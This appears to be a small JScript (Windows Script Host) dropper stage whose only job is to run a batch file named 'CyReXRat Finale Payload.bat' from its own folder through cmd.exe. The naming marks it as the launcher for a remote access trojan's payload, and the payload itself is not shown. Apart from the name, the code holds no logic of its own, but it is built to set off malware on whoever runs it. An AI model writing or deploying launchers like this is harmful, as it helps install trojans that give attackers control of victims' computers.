
var objShell = WScript.CreateObject("WScript.Shell");


var scriptPath = WScript.ScriptFullName;
var folderPath = scriptPath.substring(0, scriptPath.lastIndexOf("\\") + 1);


var batchFileName = "CyReXRat Finale Payload.bat";


var batchFilePath = folderPath + batchFileName;


try {
    objShell.Run('cmd.exe /c "' + batchFilePath + '"', 1, false);
} catch (e) {
    WScript.Echo("Error: Could not run the batch file. " + e.message);
}
